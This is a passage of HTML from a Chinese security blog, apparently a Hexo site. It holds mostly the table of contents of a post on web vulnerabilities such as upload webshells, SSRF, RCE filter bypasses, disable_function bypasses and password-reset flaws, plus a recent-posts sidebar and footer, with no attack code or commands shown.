href="#%E7%9C%9F%E5%AE%9E%E9%A2%98%E7%9B%AE"><span class="toc-number">3.26.</span> <span class="toc-text">真实题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-BabyUpload%E3%80%90%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8F%98%E7%A7%8D-htaccess-MIME%E9%AA%8C%E8%AF%81%E3%80%91"><span class="toc-number">3.26.1.</span> <span class="toc-text">[GXYCTF2019]BabyUpload【一句话木马变种+.htaccess+MIME验证】</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%9C%89%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-number">3.27.</span> <span class="toc-text">一些有关知识</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">5.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dict"><span class="toc-number">5.1.</span> <span class="toc-text">dict</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gopher"><span class="toc-number">5.2.</span> <span class="toc-text">gopher</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E6%89%93redis"><span class="toc-number">5.2.1.</span> <span class="toc-text">gopher打redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E4%BC%A0POST%E6%95%B0%E6%8D%AE"><span class="toc-number">5.2.2.</span> <span class="toc-text">gopher传POST数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-number">6.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">6.1.</span> <span class="toc-text">命令执行的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.1.1.</span> <span class="toc-text">代码执行漏洞和命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.1.1.1.</span> <span class="toc-text">代码执行漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.1.1.2.</span> <span class="toc-text">命令执行漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9Burl%E7%BC%96%E7%A0%81"><span class="toc-number">6.1.1.3.</span> <span class="toc-text">一些url编码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6"><span class="toc-number">6.1.2.</span> <span class="toc-text">管道符</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#windows"><span class="toc-number">6.1.2.1.</span> <span class="toc-text">windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux"><span class="toc-number">6.1.2.2.</span> <span class="toc-text">linux</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%A0%E7%A7%8Dbypass"><span class="toc-number">6.1.3.</span> <span class="toc-text">几种bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81"><span class="toc-number">6.1.3.1.</span> <span class="toc-text">base64编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4cat"><span class="toc-number">6.1.3.2.</span> <span class="toc-text">过滤cat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E3%80%90windows%E4%B8%8D%E9%80%82%E7%94%A8%E3%80%91"><span class="toc-number">6.1.3.3.</span> <span class="toc-text">过滤空格【windows不适用】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8D%A2%E8%A1%8Cbypass"><span class="toc-number">6.1.3.4.</span> <span class="toc-text">换行bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="toc-number">6.1.3.5.</span> <span class="toc-text">花括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">6.1.3.6.</span> <span class="toc-text">黑名单绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">6.1.3.7.</span> <span class="toc-text">长度限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">6.1.3.8.</span> <span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%88%86%E5%89%B2%E7%AC%A6-amp-%EF%BC%9B"><span class="toc-number">6.1.3.9.</span> <span class="toc-text">过滤分割符 | &amp; ；</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87disable-function"><span class="toc-number">6.2.</span> <span class="toc-text">绕过disable_function</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">6.2.1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">6.2.1.1.</span> <span class="toc-text">[极客大挑战 2019]RCE ME</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-1"><span class="toc-number">6.2.2.</span> <span class="toc-text">参考文章</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">6.2.3.</span> <span class="toc-text">一些知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fork-x2F-exec%E6%9C%BA%E5%88%B6"><span class="toc-number">6.2.3.1.</span> <span class="toc-text">fork&#x2F;exec机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cgi"><span class="toc-number">6.2.3.2.</span> <span class="toc-text">cgi</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2shell"><span class="toc-number">6.2.4.</span> <span class="toc-text">切换shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number">6.2.5.</span> <span class="toc-text">LD_PRELOAD</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-2"><span class="toc-number">6.2.5.1.</span> <span class="toc-text">参考文章</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">6.2.5.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%B8%80%E3%80%90%E5%9F%BA%E6%9C%AC%E8%B0%83%E7%94%A8%E5%8F%82%E8%80%83%E3%80%91"><span class="toc-number">6.2.5.3.</span> <span class="toc-text">例子一【基本调用参考】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%BA%8C%E3%80%90%E4%BF%AE%E6%94%B9id%E3%80%91"><span class="toc-number">6.2.5.4.</span> <span class="toc-text">例子二【修改id】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%B8%89%E3%80%90mail%E2%80%93-gt-sendmail%E2%80%93-gt-getuid-%E2%80%93-gt-LD-PRELOAD%E3%80%91"><span class="toc-number">6.2.5.5.</span> <span class="toc-text">例子三【mail–&gt;sendmail–&gt;getuid()–&gt;LD_PRELOAD】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E5%9B%9B%E3%80%90%E5%85%B1%E4%BA%AB%E5%8A%AB%E6%8C%81%E5%AF%B9%E8%B1%A1%E3%80%91"><span class="toc-number">6.2.5.6.</span> <span class="toc-text">例子四【共享劫持对象】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E8%8C%83LD-PRELOAD"><span class="toc-number">6.2.5.7.</span> <span class="toc-text">防范LD_PRELOAD</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellshock"><span class="toc-number">6.2.6.</span> <span class="toc-text">shellshock</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-3"><span class="toc-number">6.2.6.1.</span> <span class="toc-text">参考文章</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">6.2.6.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%B8%80%E3%80%90error-log%E8%A7%A6%E6%B3%95%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E3%80%91"><span class="toc-number">6.2.6.3.</span> <span class="toc-text">例子一【error_log触法环境变量】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%BA%8C%E3%80%90%E7%BB%93%E5%90%88cgi%E3%80%91%E3%80%90CVE-2014-6271-Shellshock-%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%E3%80%91"><span class="toc-number">6.2.6.4.</span> <span class="toc-text">例子二【结合cgi】【CVE-2014-6271 Shellshock 破壳漏洞】</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Mod-CGI"><span class="toc-number">6.2.7.</span> <span class="toc-text">Apache Mod CGI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">6.2.7.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%E4%B8%80%E3%80%90-htaccess%E4%BD%BF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E4%B8%BAcgi%E8%84%9A%E6%9C%AC%E3%80%91"><span class="toc-number">6.2.7.2.</span> <span class="toc-text">例子一【.htaccess使文件解析为cgi脚本】</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-FPM"><span class="toc-number">6.2.8.</span> <span class="toc-text">PHP-FPM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3"><span class="toc-number">6.2.8.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">7.1.</span> <span class="toc-text">php原生类的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-4"><span class="toc-number">7.1.1.</span> <span class="toc-text">参考文章</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SoupClient"><span class="toc-number">7.1.2.</span> <span class="toc-text">SoupClient</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">8.</span> <span class="toc-text">逻辑漏洞：任意用户密码重置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E7%BD%AE%E5%87%AD%E8%AF%81%E6%B3%84%E6%BC%8F"><span class="toc-number">8.1.</span> <span class="toc-text">重置凭证泄漏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">8.1.1.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E7%BD%AE%E5%87%AD%E8%AF%81%E6%8E%A5%E6%94%B6%E7%AB%AF%E5%8F%AF%E7%AF%A1%E6%94%B9"><span class="toc-number">8.2.</span> <span class="toc-text">重置凭证接收端可篡改</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="toc-number">8.2.1.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%B7%B7%E6%B7%86"><span class="toc-number">8.3.</span> <span class="toc-text">用户混淆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-2"><span class="toc-number">8.3.1.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E7%BD%AE%E5%87%AD%E8%AF%81%E6%9C%AA%E6%A0%A1%E9%AA%8C"><span class="toc-number">8.4.</span> <span class="toc-text">重置凭证未校验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-3"><span class="toc-number">8.4.1.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E7%BD%AE%E5%87%AD%E8%AF%81%E5%8F%AF%E6%9A%B4%E7%A0%B4"><span class="toc-number">8.5.</span> <span class="toc-text">重置凭证可暴破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-4"><span class="toc-number">8.5.1.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%AD%94%E4%B8%AD%E5%AD%98%E5%9C%A8%E5%BD%B1%E5%93%8D%E5%90%8E%E7%BB%AD%E9%80%BB%E8%BE%91%E7%9A%84%E7%8A%B6%E6%80%81%E5%8F%82%E6%95%B0"><span class="toc-number">8.6.</span> <span class="toc-text">应答中存在影响后续逻辑的状态参数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-5"><span class="toc-number">8.6.1.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token%E5%8F%AF%E9%A2%84%E6%B5%8B"><span class="toc-number">8.7.</span> <span class="toc-text">Token可预测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-6"><span class="toc-number">8.7.1.</span> <span class="toc-text">防御</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/26/%E7%94%B1%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%B9%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/" title="由重定向对反弹shell的一些思考"><img src="/img/gd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="由重定向对反弹shell的一些思考"/></a><div class="content"><a class="title" href="/2023/06/26/%E7%94%B1%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%B9%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/" title="由重定向对反弹shell的一些思考">由重定向对反弹shell的一些思考</a><time datetime="2023-06-26T06:12:25.000Z" title="Created 2023-06-26 14:12:25">2023-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/26/%E6%96%87%E7%AB%A0%E5%9C%B0%E5%9D%80/" title="文章地址"><img src="/img/gd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文章地址"/></a><div class="content"><a class="title" href="/2023/06/26/%E6%96%87%E7%AB%A0%E5%9C%B0%E5%9D%80/" title="文章地址">文章地址</a><time datetime="2023-06-26T05:06:49.000Z" title="Created 2023-06-26 13:06:49">2023-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="基础漏洞总结"><img src="/img/gd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基础漏洞总结"/></a><div class="content"><a class="title" href="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="基础漏洞总结">基础漏洞总结</a><time datetime="2023-06-26T03:19:37.000Z" title="Created 2023-06-26 11:19:37">2023-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/16/python-point/" title="python point"><img src="/img/gd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python point"/></a><div class="content"><a class="title" href="/2023/04/16/python-point/" title="python point">python point</a><time datetime="2023-04-16T09:59:50.000Z" title="Created 2023-04-16 17:59:50">2023-04-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/09/BypassUAC-DLL%E5%8A%AB%E6%8C%81/" title="DLL劫持-模拟可信任目录"><img src="/img/gd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DLL劫持-模拟可信任目录"/></a><div class="content"><a class="title" href="/2023/04/09/BypassUAC-DLL%E5%8A%AB%E6%8C%81/" title="DLL劫持-模拟可信任目录">DLL劫持-模拟可信任目录</a><time datetime="2023-04-09T08:25:21.000Z" title="Created 2023-04-09 16:25:21">2023-04-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By a1batr0ss</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">简</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Algolia</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>